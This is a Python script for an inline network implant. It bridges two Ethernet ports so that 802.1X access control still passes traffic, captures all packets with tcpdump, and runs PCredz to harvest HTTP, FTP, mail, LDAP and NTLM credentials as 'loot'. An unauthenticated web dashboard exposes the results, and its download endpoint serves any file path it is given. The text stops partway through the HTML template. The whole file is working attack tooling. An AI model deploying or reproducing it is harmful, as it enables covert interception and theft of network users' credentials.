#!/usr/bin/env python3
"""
NAC Bridge Monitor - Transparent Inline Tap Edition
Completely transparent L2 bridge for 802.1X environments
No stealth mode - bridge always active for seamless operation
Run as root: sudo python3 nac-monitor.py
"""

import os
import sys
import json
import subprocess
import re
import time
import signal
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'MGMT_INTERFACES': ['wlan0', 'wlan1', 'wlp', 'wifi'],
    'BRIDGE_NAME': 'br0',
    'PCAP_DIR': '/var/log/nac-captures',
    'PIDFILE': '/var/run/auto-nac-tcpdump.pid',
    'STATEFILE': '/var/run/auto-nac-state.conf',
    'LOGFILE': '/var/log/auto-nac-bridge.log',
    'LOOT_FILE': '/var/log/nac-captures/loot.json',
    'PCREDZ_PATH': '/opt/PCredz/pcredz-wrapper.sh',
    'WEB_PORT': 8080,
    'TRANSPARENT_MODE': True,  # Bridge always active (802.1X compatible)
    'ANALYSIS_INTERVAL': 300,  # Seconds between automated loot scans
}

capture_lock = threading.Lock()
shutdown_in_progress = False

# ============================================================================
# UTILITIES
# ============================================================================

def log(message, level='INFO'):
    """Thread-safe logging"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"[{timestamp}] [{level}] {message}"
    print(log_line)
    try:
        with open(CONFIG['LOGFILE'], 'a') as f:
            f.write(log_line + '\n')
    except Exception:
        pass

def run_cmd(cmd, check=False, timeout=None):
    """Run command and return result"""
    try:
        return subprocess.run(cmd, capture_output=True, text=True,
                              check=check, timeout=timeout)
    except Exception:
        return None

def is_mgmt_interface(iface):
    """Check if interface is management/wireless"""
    for mgmt in CONFIG['MGMT_INTERFACES']:
        if iface.startswith(mgmt):
            return True
    return (os.path.exists(f"/sys/class/net/{iface}/wireless") or
            os.path.exists(f"/sys/class/net/{iface}/phy80211"))

# ============================================================================
# LOOT ANALYZER
# ============================================================================

class LootAnalyzer:
    """Analyzes PCAP for credentials using PCredz"""

    def __init__(self):
        self.pcredz_path = CONFIG['PCREDZ_PATH']
        self.loot_items = []
        self.loot_file = CONFIG['LOOT_FILE']
        self.raw_output_file = CONFIG['LOOT_FILE'].replace('.json', '_raw.txt')
        self.analysis_lock = threading.Lock()
        self.raw_output = ""
        self.load_existing_loot()

    def analyze_pcap(self, pcap_file):
        """Run PCredz on PCAP file"""
        if not os.path.exists(self.pcredz_path):
            log("PCredz wrapper not found", 'WARNING')
            return {'success': False, 'error': 'PCredz not installed', 'new_items': 0}

        if not os.path.exists(pcap_file):
            log(f"PCAP file not found: {pcap_file}", 'ERROR')
            return {'success': False, 'error': 'PCAP file not found', 'new_items': 0}

        file_size = os.path.getsize(pcap_file) / 1024 / 1024
        log(f"Analyzing {os.path.basename(pcap_file)} ({file_size:.1f} MB) with PCredz...")

        try:
            result = subprocess.run(
                ['/bin/bash', self.pcredz_path, '-f', pcap_file],
                capture_output=True,
                text=True,
                timeout=300
            )

            # Save raw output
            with self.analysis_lock:
                self.raw_output = result.stdout
                self.save_raw_output()
            
            # Check if there's any output
            if result.stdout and result.stdout.strip():
                log(f"PCredz analysis complete - check Loot tab for results", 'SUCCESS')
                return {'success': True, 'output': result.stdout}
            else:
                log("No credentials found in this PCAP")
                return {'success': True, 'output': 'No credentials found'}

        except subprocess.TimeoutExpired:
            log("PCredz analysis timed out (>5min)", 'WARNING')
            return {'success': False, 'error': 'Analysis timed out', 'new_items': 0}
        except Exception as e:
            log(f"PCredz analysis failed: {e}", 'ERROR')
            return {'success': False, 'error': str(e), 'new_items': 0}

    def parse_pcredz_output(self, output, pcap_file):
        """Parse PCredz output for credentials"""
        loot = []
        timestamp = datetime.now().isoformat()

        # Compile regex patterns once for efficiency (reuse compiled patterns)
        if not hasattr(self, '_compiled_patterns'):
            self._compiled_patterns = [
                (re.compile(r'HTTP.*?(?:User|Username|Login):\s*(\S+).*?(?:Pass|Password):\s*(\S+)', re.IGNORECASE | re.DOTALL), 'HTTP'),
                (re.compile(r'FTP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'FTP'),
                (re.compile(r'SMTP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'SMTP'),
                (re.compile(r'IMAP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'IMAP'),
                (re.compile(r'POP3.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'POP3'),
                (re.compile(r'NTLM.*?(?:User|Username):\s*(\S+).*?(?:Hash|Password):\s*(\S+)', re.IGNORECASE | re.DOTALL), 'NTLM'),
                (re.compile(r'Kerberos.*?User:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'KERBEROS'),
                (re.compile(r'LDAP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'LDAP'),
            ]

        for pattern, proto in self._compiled_patterns:
            for match in pattern.finditer(output):
                username = match.group(1).strip()
                password = match.group(2).strip() if len(match.groups()) > 1 else 'N/A'

                if not self._is_duplicate(proto, username, password):
                    loot.append({
                        'id': len(self.loot_items) + len(loot) + 1,
                        'timestamp': timestamp,
                        'protocol': proto,
                        'username': username,
                        'password': password,
                        'source': os.path.basename(pcap_file),
                        'raw': match.group(0)[:200]
                    })

        return loot

    def _is_duplicate(self, proto, username, password):
        """Check if credential already captured - optimized with early exit"""
        for item in self.loot_items:
            if (item.get('protocol') == proto and
                item.get('username') == username and
                item.get('password') == password):
                return True
        return False

    def save_loot(self):
        """Save loot to JSON file"""
        try:
            with open(self.loot_file, 'w') as f:
                json.dump(self.loot_items, f, indent=2)
            os.chmod(self.loot_file, 0o600)
        except Exception as e:
            log(f"Failed to save loot: {e}", 'ERROR')
    
    def save_raw_output(self):
        """Save raw PCredz output to text file"""
        try:
            with open(self.raw_output_file, 'w') as f:
                f.write(self.raw_output)
            os.chmod(self.raw_output_file, 0o600)
            log(f"Saved raw PCredz output to {self.raw_output_file}")
        except Exception as e:
            log(f"Failed to save raw output: {e}", 'ERROR')

    def load_existing_loot(self):
        """Load existing loot from file"""
        try:
            if os.path.exists(self.loot_file):
                with open(self.loot_file, 'r') as f:
                    self.loot_items = json.load(f)
                log(f"Loaded {len(self.loot_items)} existing loot items")
        except Exception:
            self.loot_items = []
        
        # Load raw output if exists
        try:
            if os.path.exists(self.raw_output_file):
                with open(self.raw_output_file, 'r') as f:
                    self.raw_output = f.read()
        except Exception:
            self.raw_output = ""

    def get_loot_summary(self):
        """Get loot statistics - returns raw output"""
        return {
            'raw_output': self.raw_output,
            'has_output': bool(self.raw_output and self.raw_output.strip())
        }

    def clear_loot(self):
        """Clear all loot"""
        with self.analysis_lock:
            self.loot_items = []
            self.raw_output = ""
            self.save_loot()
            self.save_raw_output()
        log("Loot cleared")

# ============================================================================
# BRIDGE MANAGER
# ============================================================================

class BridgeManager:
    """Manages transparent network bridge and packet capture"""

    def __init__(self):
        self.interfaces = []
        self.tcpdump_process = None
        self.pcap_file = None
        self.start_time = None
        self.loot_analyzer = LootAnalyzer()
        self.bridge_initialized = False
        self.client_ip = None
        self.gateway_ip = None
        self.analysis_interval = CONFIG.get('ANALYSIS_INTERVAL', 300)
        self.stop_monitoring = False
        self.monitor_thread = None

    def detect_interfaces(self):
        """Detect ethernet interfaces (not wireless)"""
        log("Detecting ethernet interfaces...")
        candidates = []

        result = run_cmd(['ip', '-o', 'link', 'show'])
        if not result:
            return None

        for line in result.stdout.split('\n'):
            if not line or ':' not in line:
                continue

            iface = line.split(':')[1].strip()
            iface = iface.split('@')[0]

            # Skip virtual and management interfaces
            if (re.match(r'^(lo|br|veth|docker|virbr|vmnet|tun|tap|dummy)', iface) or
                    is_mgmt_interface(iface)):
                continue

            # Only ethernet interfaces
            if re.match(r'^(eth|enp|lan|end)[0-9]', iface) and 'link/ether' in line:
                candidates.append(iface)
                log(f"  Found: {iface}")

        if len(candidates) < 2:
            log(f"ERROR: Need 2 ethernet interfaces, found {len(candidates)}", 'ERROR')
            return None

        self.interfaces = candidates[:2]
        log(f"Selected: {self.interfaces[0]} (client-side) <-> {self.interfaces[1]} (switch-side)")
        return self.interfaces

    def setup_transparent_bridge(self):
        """Setup permanent transparent L2 bridge"""
        if self.bridge_initialized:
            log("Bridge already initialized")
            return True

        if not self.interfaces and not self.detect_interfaces():
            return False

        client_int, switch_int = self.interfaces
        bridge = CONFIG['BRIDGE_NAME']

        try:
            log("=== Setting Up Transparent Bridge ===")
            log(f"Client side:  {client_int}")
            log(f"Switch side:  {switch_int}")
            log("Mode: Transparent L2 (802.1X compatible)")

            # Cleanup if exists
            if run_cmd(['ip', 'link', 'show', bridge]):
                log("Removing existing bridge...")
                self._force_cleanup_bridge()
                time.sleep(2)

            # Disable NetworkManager
            log("Disabling NetworkManager...")
            for iface in [client_int, switch_int]:
                run_cmd(['nmcli', 'device', 'set', iface, 'managed', 'no'])

            time.sleep(1)

            # Flush any IP addresses (pure L2)
            log("Flushing IP addresses (L2 only mode)...")
            for iface in [client_int, switch_int]:
                run_cmd(['ip', 'addr', 'flush', 'dev', iface])

            # Disable hardware offloading
            log("Disabling hardware offloading...")
            for iface in [client_int, switch_int]:
                for opt in ['gro', 'gso', 'tso']:
                    run_cmd(['ethtool', '-K', iface, opt, 'off'])

            # Create bridge
            log(f"Creating bridge {bridge}...")
            result = run_cmd(['ip', 'link', 'add', 'name', bridge, 'type', 'bridge'], check=False)
            if result and result.returncode != 0:
                log(f"Bridge creation failed: {result.stderr}", 'ERROR')
                return False

            # Configure for transparency
            log("Configuring bridge for transparency...")
            run_cmd(['ip', 'link', 'set', bridge, 'type', 'bridge', 'stp_state', '0'])
            run_cmd(['ip', 'link', 'set', bridge, 'type', 'bridge', 'forward_delay', '0'])
            run_cmd(['ip', 'link', 'set', bridge, 'type', 'bridge', 'ageing_time', '30000'])

            # Add interfaces to bridge
            log(f"Adding {client_int} to bridge...")
            result = run_cmd(['ip', 'link', 'set', client_int, 'master', bridge])
            if result and result.returncode != 0:
                log(f"Failed to add {client_int}: {result.stderr}", 'ERROR')
                return False

            log(f"Adding {switch_int} to bridge...")
            result = run_cmd(['ip', 'link', 'set', switch_int, 'master', bridge])
            if result and result.returncode != 0:
                log(f"Failed to add {switch_int}: {result.stderr}", 'ERROR')
                return False

            # Bring UP interfaces
            log("Bringing UP interfaces...")
            for iface in [client_int, switch_int]:
                result = run_cmd(['ip', 'link', 'set', iface, 'up'])
                if result and result.returncode == 0:
                    log(f"  ✓ {iface}: UP")
                else:
                    log(f"  ✗ {iface}: FAILED", 'ERROR')
                    return False

            # Bring UP bridge
            log(f"Bringing UP bridge {bridge}...")
            result = run_cmd(['ip', 'link', 'set', bridge, 'up'])
            if result and result.returncode != 0:
                log(f"Bridge UP failed: {result.stderr}", 'ERROR')
                return False

            log("Waiting for bridge to stabilize (3s)...")
            time.sleep(3)

            # Verify
            log("Verifying bridge...")
            result = run_cmd(['ip', 'link', 'show', bridge])
            if not result or 'state UP' not in result.stdout:
                log("Bridge verification FAILED - not UP", 'ERROR')
                log(f"Bridge output: {result.stdout if result else 'None'}", 'ERROR')
                return False

            result = run_cmd(['bridge', 'link', 'show'])
            if not result or client_int not in result.stdout or switch_int not in result.stdout:
                log("Bridge verification FAILED - members missing", 'ERROR')
                return False

            log("✓ Bridge verified and operational", 'SUCCESS')
            log("✓ 802.1X traffic will pass through transparently")

            self.bridge_initialized = True
            self._save_state()
            log("=== Transparent Bridge Ready ===", 'SUCCESS')
            return True

        except Exception as e:
            log(f"Bridge setup failed: {e}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return False

    def start_capture(self):
        """Start packet capture on bridge"""
        if self.tcpdump_process and self.tcpdump_process.poll() is None:
            log("Capture already running", 'WARNING')
            return True

        try:
            log("=== Starting Packet Capture ===")

            # Ensure bridge is set up
            if not self.bridge_initialized:
                log("Bridge not initialized, setting up...")
                if not self.setup_transparent_bridge():
                    return False

            # Final verification
            result = run_cmd(['ip', 'link', 'show', CONFIG['BRIDGE_NAME']])
            if not result or 'state UP' not in result.stdout:
                log("ERROR: Bridge is not UP!", 'ERROR')
                return False

            # Create capture directory
            os.makedirs(CONFIG['PCAP_DIR'], exist_ok=True)

            # Generate filename
            timestamp = datetime.now().strftime('%Y%m%dT%H%M%SZ')
            self.pcap_file = os.path.join(CONFIG['PCAP_DIR'], f'capture-{timestamp}.pcap')

            log(f"Starting tcpdump on {CONFIG['BRIDGE_NAME']}...")
            log(f"Output: {self.pcap_file}")

            # Start tcpdump
            self.tcpdump_process = subprocess.Popen(
                ['tcpdump', '-i', CONFIG['BRIDGE_NAME'], '-s', '0', '-U',
                 '-w', self.pcap_file, 'not arp and not stp'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setpgrp
            )

            time.sleep(2)

            # Verify
            if self.tcpdump_process.poll() is not None:
                stderr = self.tcpdump_process.stderr.read().decode()
                log(f"tcpdump failed: {stderr}", 'ERROR')
                return False

            with open(CONFIG['PIDFILE'], 'w') as f:
                f.write(str(self.tcpdump_process.pid))

            self.start_time = datetime.now().isoformat()
            self.stop_monitoring = False

            log(f"✓ tcpdump started (PID: {self.tcpdump_process.pid})", 'SUCCESS')

            # Start monitoring
            self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
            self.monitor_thread.start()

            self._save_state()
            log("=== Capture Started ===", 'SUCCESS')
            return True

        except Exception as e:
            log(f"Capture start failed: {e}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return False

    def _monitor_loop(self):
        """Monitor PCAP size and analyze"""
        last_analysis = time.time()

        while not self.stop_monitoring:
            try:
                if not self.tcpdump_process or self.tcpdump_process.poll() is not None:
                    break

                if self.pcap_file and os.path.exists(self.pcap_file):
                    if self.analysis_interval and time.time() - last_analysis >= self.analysis_interval:
                        log("Running periodic analysis...")
                        threading.Thread(
                            target=self.loot_analyzer.analyze_pcap,
                            args=(self.pcap_file,),
                            daemon=True
                        ).start()
                        last_analysis = time.time()

                time.sleep(5)

            except Exception as e:
                log(f"Monitor loop error: {e}", 'ERROR')
                time.sleep(5)

    def delete_pcap(self):
        """Delete the current capture (requires capture to be stopped)"""
        if self.tcpdump_process and self.tcpdump_process.poll() is None:
            log("Cannot delete PCAP while capture is running", 'WARNING')
            return False, 'Capture is still running'

        if not self.pcap_file:
            log("No PCAP file to delete", 'WARNING')
            return False, 'No PCAP file to delete'

        try:
            if os.path.exists(self.pcap_file):
                os.remove(self.pcap_file)
                log(f"Deleted PCAP file {self.pcap_file}")
            else:
                log("PCAP path does not exist on disk", 'WARNING')
                return False, 'PCAP file not found'
        except Exception as e:
            log(f"Failed to delete PCAP: {e}", 'ERROR')
            return False, str(e)

        self.pcap_file = None
        self._save_state()
        return True, None

    def stop_capture(self):
        """Stop capture (keep bridge running)"""
        log("Stopping capture...")
        self.stop_monitoring = True

        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=5)

        try:
            if self.tcpdump_process:
                self.tcpdump_process.terminate()
                try:
                    self.tcpdump_process.wait(timeout=5)
                except Exception:
                    self.tcpdump_process.kill()
                self.tcpdump_process = None

            if self.pcap_file and os.path.exists(self.pcap_file):
                log("Running final analysis...")
                self.loot_analyzer.analyze_pcap(self.pcap_file)

            if os.path.exists(CONFIG['PIDFILE']):
                os.remove(CONFIG['PIDFILE'])

            self.start_time = None
            log("Capture stopped (bridge remains active)", 'SUCCESS')
            return True

        except Exception as e:
            log(f"Stop failed: {e}", 'ERROR')
            return False

    def _force_cleanup_bridge(self):
        """Force cleanup bridge"""
        bridge = CONFIG['BRIDGE_NAME']
        run_cmd(['ip', 'link', 'set', bridge, 'down'])
        run_cmd(['ip', 'link', 'delete', bridge])

        for iface in self.interfaces:
            run_cmd(['ip', 'link', 'set', iface, 'nomaster'])

    def get_status(self):
        """Get current status"""
        status = {
            'status': 'inactive',
            'bridge': None,
            'bridge_active': self.bridge_initialized,
            'interfaces': [],
            'pcap_file': None,
            'pcap_size': 0,
            'packet_count': 0,
            'pid': None,
            'start_time': None,
            'client_ip': self.client_ip,
            'gateway_ip': self.gateway_ip,
            'logs': self._get_logs()
        }

        if self.tcpdump_process and self.tcpdump_process.poll() is None:
            status['status'] = 'active'
            status['pid'] = self.tcpdump_process.pid
            status['pcap_file'] = self.pcap_file
            status['start_time'] = self.start_time
            status['bridge'] = CONFIG['BRIDGE_NAME']

            # Update IPs
            self._detect_network_ips()
            status['client_ip'] = self.client_ip
            status['gateway_ip'] = self.gateway_ip

            if self.pcap_file and os.path.exists(self.pcap_file):
                status['pcap_size'] = os.path.getsize(self.pcap_file)
                # Use capinfos if available for faster packet counting, otherwise skip
                result = run_cmd(['capinfos', '-c', self.pcap_file], timeout=2)
                if result and result.returncode == 0 and result.stdout:
                    # capinfos outputs: Number of packets: 1234
                    match = re.search(r'Number of packets:\s*(\d+)', result.stdout)
                    if match:
                        status['packet_count'] = int(match.group(1))
                    else:
                        status['packet_count'] = 0
                else:
                    # Skip counting if capinfos not available (too slow with tcpdump)
                    status['packet_count'] = 0
        else:
            if self.pcap_file and os.path.exists(self.pcap_file):
                status['pcap_file'] = self.pcap_file
                status['pcap_size'] = os.path.getsize(self.pcap_file)

        status['interfaces'] = self._get_interfaces()
        return status

    def _detect_network_ips(self):
        """Best-effort detection of client and gateway IPs."""
        try:
            gateway_ip = None
            route = run_cmd(['ip', '-4', 'route', 'show', 'default'])
            if route and route.returncode == 0:
                match = re.search(r'default via (\S+)', route.stdout)
                if match:
                    gateway_ip = match.group(1)

            client_ip = None
            if self.interfaces:
                neigh = run_cmd(['ip', '-4', 'neigh', 'show'])
                if neigh and neigh.returncode == 0:
                    for line in neigh.stdout.splitlines():
                        parts = line.split()
                        if not parts or 'FAILED' in parts or 'dev' not in parts:
                            continue
                        dev = parts[parts.index('dev') + 1]
                        if dev == self.interfaces[0]:
                            client_ip = parts[0]
                            break

            if client_ip:
                self.client_ip = client_ip
            if gateway_ip:
                self.gateway_ip = gateway_ip
        except Exception as e:
            log(f"Failed to detect network IPs: {e}", 'WARNING')

    def _save_state(self):
        """Save state"""
        try:
            with open(CONFIG['STATEFILE'], 'w') as f:
                if self.interfaces:
                    f.write(f'CLIENT_INT="{self.interfaces[0]}"\n')
                    f.write(f'SWITCH_INT="{self.interfaces[1]}"\n')
                f.write(f'BRIDGE_NAME="{CONFIG["BRIDGE_NAME"]}"\n')
                if self.pcap_file:
                    f.write(f'PCAP_FILE="{self.pcap_file}"\n')
                if self.start_time:
                    f.write(f'START_TIME="{self.start_time}"\n')
        except Exception:
            pass

    def _get_interfaces(self):
        """Get all network interfaces"""
        interfaces = []
        result = run_cmd(['ip', '-j', 'link', 'show'])
        if not result:
            return interfaces

        try:
            for iface in json.loads(result.stdout):
                name = iface.get('ifname', '')
                if name.startswith(('lo', 'docker', 'veth', 'virbr')):
                    continue

                state = 'UP' if 'UP' in iface.get('flags', []) else 'DOWN'
                mac = iface.get('address', 'N/A')

                role = 'Unknown'
                if is_mgmt_interface(name):
                    role = 'Management (Wireless) 🔒'
                elif self.interfaces and name in self.interfaces:
                    # Optimize: avoid O(n) index() lookup by using enumerate
                    try:
                        idx = self.interfaces.index(name)
                        role = f'Tap Port ({"Client" if idx == 0 else "Switch"})'
                    except ValueError:
                        pass
                if role == 'Unknown':
                    if name.startswith(('eth', 'enp', 'lan', 'end')):
                        role = 'Ethernet'
                    elif name == CONFIG['BRIDGE_NAME']:
                        role = 'Transparent Bridge (Always Active)'

                speed = 'Unknown'
                result = run_cmd(['ethtool', name], timeout=1)
                if result:
                    for line in result.stdout.split('\n'):
                        if 'Speed:' in line:
                            speed = line.split('Speed:')[1].strip()
                            break

                bridge = None
                result = run_cmd(['bridge', 'link', 'show', 'dev', name])
                if result:
                    match = re.search(r'master (\S+)', result.stdout)
                    if match:
                        bridge = match.group(1)

                interfaces.append({
                    'name': name,
                    'state': state,
                    'mac': mac,
                    'role': role,
                    'speed': speed,
                    'bridge': bridge
                })
        except Exception:
            pass

        return interfaces

    def _get_logs(self, lines=10):
        """Get recent logs - optimized to read only last N lines"""
        try:
            if os.path.exists(CONFIG['LOGFILE']):
                # Use efficient tail reading for large log files
                result = run_cmd(['tail', '-n', str(lines), CONFIG['LOGFILE']], timeout=1)
                if result and result.stdout:
                    return [line.strip() for line in result.stdout.strip().split('\n') if line.strip()]
                # Fallback if tail fails
                with open(CONFIG['LOGFILE'], 'r') as f:
                    return [line.strip() for line in f.readlines()[-lines:] if line.strip()]
        except Exception:
            pass
        return []

# ============================================================================
# WEB SERVER
# ============================================================================

class NACWebHandler(BaseHTTPRequestHandler):
    bridge_manager = None

    def log_message(self, format, *args):
        pass

    def _send_json(self, data, status=200):
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def _send_html(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(get_html_template().encode())

    def do_GET(self):
        path = urlparse(self.path).path

        if path in ['/', '/index.html']:
            self._send_html()
        elif path == '/api/status':
            self._send_json(self.bridge_manager.get_status())
        elif path == '/api/loot':
            self._send_json(self.bridge_manager.loot_analyzer.get_loot_summary())
        elif path == '/api/loot/export':
            raw_output = self.bridge_manager.loot_analyzer.raw_output
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Disposition',
                             'attachment; filename="pcredz_output.txt"')
            self.end_headers()
            self.wfile.write(raw_output.encode('utf-8'))
        elif path == '/api/download':
            query = parse_qs(urlparse(self.path).query)
            pcap_file = query.get('file', [None])[0]
            if pcap_file and os.path.exists(pcap_file):
                try:
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/vnd.tcpdump.pcap')
                    self.send_header('Content-Disposition',
                                     f'attachment; filename="{os.path.basename(pcap_file)}"')
                    self.end_headers()
                    with open(pcap_file, 'rb') as f:
                        self.wfile.write(f.read())
                except Exception:
                    self.send_error(500)
            else:
                self.send_error(404)
        else:
            self.send_error(404)

    def do_POST(self):
        path = urlparse(self.path).path

        if path == '/api/start':
            with capture_lock:
                success = self.bridge_manager.start_capture()
            self._send_json({'success': success})
        elif path == '/api/stop':
            with capture_lock:
                success = self.bridge_manager.stop_capture()
            self._send_json({'success': success})
        elif path == '/api/analyze':
            # Manual PCredz analysis
            pcap_file = self.bridge_manager.pcap_file
            if pcap_file and os.path.exists(pcap_file):
                result = self.bridge_manager.loot_analyzer.analyze_pcap(pcap_file)
                self._send_json(result)
            else:
                self._send_json({'success': False, 'error': 'No PCAP file available', 'new_items': 0})
        elif path == '/api/delete_pcap':
            with capture_lock:
                success, error = self.bridge_manager.delete_pcap()
            response = {'success': success}
            if not success and error:
                response['error'] = error
            self._send_json(response)
        elif path == '/api/loot/clear':
            self.bridge_manager.loot_analyzer.clear_loot()
            self._send_json({'success': True})
        else:
            self.send_error(404)

# ============================================================================
# HTML TEMPLATE
# ============================================================================

def get_html_template():
    """Return complete HTML template"""
    return '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NAC Bridge Monitor - Transparent Tap</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px;color:#333}
.container{max-width:1400px;margin:0 auto}
.header{text-align:center;color:#fff;margin-bottom:30px}
.header h1{font-size:2.5em;margin-bottom:5px;text-shadow:2px 2px 4px rgba(0,0,0,.3)}
.header p{font-size:1em;opacity:.9}
.dashboard{background:#fff;border-radius:15px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,.2)}
.info-banner{background:#e3f2fd;border-left:4px solid #2196f3;padding:15px;margin-bottom:20px;border-radius:5px}
.info-banner h3{color:#1976d2;margin-bottom:5px}
.info-banner p{color:#555;font-size:.9em}
.tab-nav{display:flex;gap:10px;margin-bottom:25px;border-bottom:2px solid #e0e0e0}
.tab-btn{padding:12px 24px;border:none;background:transparent;cursor:pointer;font-weight:600;color:#666;border-bottom:3px solid transparent;transition:all .3s}
.tab-btn:hover{color:#667eea}
.tab-btn.active{color:#667eea;border-bottom-color:#667eea}
.badge{display:inline-block;background:#dc3545;color:#fff;border-radius:12px;padding:2px 8px;font-size:.75em;margin-left:5px;min-width:20px;text-align:center}
.tab-content{display:none}
.tab-content.active{display:block}
.status-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:15px;border-bottom:2px solid #f0f0f0}
.status-badge{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;border-radius:20px;font-weight:600;font-size:.9em}
.status-badge.active{background:#d4edda;color:#155724}
.status-badge.inactive{background:#f8d7da;color:#721c24}
.status-indicator{width:12px;height:12px;border-radius:50%}
.status-indicator.active{background:#28a745;animation:pulse 2s infinite}
.status-indicator.inactive{background:#dc3545}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;margin-bottom:30px}
.card{background:#f8f9fa;border-radius:10px;padding:20px;border-left:4px solid #667eea}
.card-title{font-size:.9em;color:#666;margin-bottom:10px;text-transform:uppercase}
.card-value{font-size:1.8em;font-weight:700;color:#333}
.card-detail{font-size:.85em;color:#888;margin-top:5px}
.interface-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:15px;margin-top:15px}
.interface-card{background:#fff;border:2px solid #e0e0e0;border-radius:8px;padding:15px;transition:all .3s}
.interface-card:hover{border-color:#667eea;box-shadow:0 4px 12px rgba(102,126,234,0.2)}
.interface-header{display:flex;justify-content:space-between;margin-bottom:12px}
.interface-name{font-weight:700;font-size:1.1em;color:#667eea}
.interface-status{padding:4px 10px;border-radius:12px;font-size:.75em;font-weight:600}
.interface-status.up{background:#d4edda;color:#155724}
.interface-status.down{background:#f8d7da;color:#721c24}
.interface-detail{display:flex;justify-content:space-between;padding:6px 0;font-size:.9em;border-bottom:1px solid #f0f0f0}
.button-group{display:flex;gap:15px;flex-wrap:wrap;margin-top:20px}
.btn{flex:1;min-width:180px;padding:15px 30px;border:none;border-radius:8px;font-size:1em;font-weight:600;cursor:pointer;transition:all .3s;color:#fff}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn-start{background:#28a745}
.btn-start:hover:not(:disabled){background:#218838;transform:translateY(-2px)}
.btn-stop{background:#dc3545}
.btn-stop:hover:not(:disabled){background:#c82333;transform:translateY(-2px)}
.btn-refresh{background:#667eea}
.btn-refresh:hover:not(:disabled){background:#5568d3;transform:translateY(-2px)}
.btn-download{background:#17a2b8}
.btn-download:hover:not(:disabled){background:#138496;transform:translateY(-2px)}
.btn-danger{background:#dc3545}
.btn-danger:hover:not(:disabled){background:#c82333;transform:translateY(-2px)}
.alert{padding:15px;border-radius:8px;margin-bottom:20px;display:none}
.alert.show{display:block}
.alert-success{background:#d4edda;color:#155724}
.alert-error{background:#f8d7da;color:#721c24}
.alert-info{background:#d1ecf1;color:#0c5460}
.capture-info{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border-radius:10px;padding:25px;margin-bottom:20px;display:none}
.capture-info.active{display:block}
.capture-detail{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.2)}
.logs-section{background:#1e1e1e;color:#0f0;border-radius:8px;padding:20px;margin-top:20px;font-family:monospace;font-size:.85em;max-height:300px;overflow-y:auto}
.loot-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin:20px 0}
.stat-card{background:#f8f9fa;border-radius:10px;padding:20px;text-align:center;border-left:4px solid #dc3545}
.stat-value{font-size:2.5em;font-weight:700;color:#333;margin-bottom:5px}
.stat-label{font-size:.9em;color:#666;text-transform:uppercase}
.loot-filters{display:flex;gap:10px;flex-wrap:wrap;margin:20px 0}
.filter-btn{padding:8px 16px;border:2px solid #e0e0e0;background:#fff;border-radius:20px;cursor:pointer;font-weight:600;color:#666;transition:all .3s}
.filter-btn:hover{border-color:#667eea;color:#667eea}
.filter-btn.active{background:#667eea;color:#fff;border-color:#667eea}
.loot-items{display:flex;flex-direction:column;gap:10px;margin:20px 0;max-height:500px;overflow-y:auto}
.loot-item{background:#fff;border:1px solid #e0e0e0;border-left:4px solid #dc3545;border-radius:8px;padding:15px;transition:all .3s}
.loot-item:hover{box-shadow:0 4px 12px rgba(0,0,0,.1);transform:translateX(5px)}
.loot-item.http{border-left-color:#28a745}
.loot-item.ftp{border-left-color:#17a2b8}
.loot-item.smtp{border-left-color:#ffc107}
.loot-item.ntlm{border-left-color:#dc3545}
.loot-item.imap{border-left-color:#6f42c1}
.loot-header{display:flex;justify-content:space-between;margin-bottom:10px}
.loot-protocol{font-weight:700;color:#667eea;font-size:1.1em}
.loot-timestamp{font-size:.85em;color:#999}
.loot-content{font-family:monospace;font-size:.9em;background:#f8f9fa;padding:10px;border-radius:5px;margin-top:10px}
.loot-field{padding:5px 0}
.loot-field strong{color:#333}
.empty-state{text-align:center;padding:60px 20px;color:#999}
.empty-state-icon{font-size:4em;margin-bottom:20px;opacity:.5}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🔍 NAC Bridge Monitor</h1>
<p>Transparent Inline Tap - 802.1X Compatible</p>
</div>
<div class="dashboard">
<div class="info-banner">
<h3>ℹ️ Transparent Mode Active</h3>
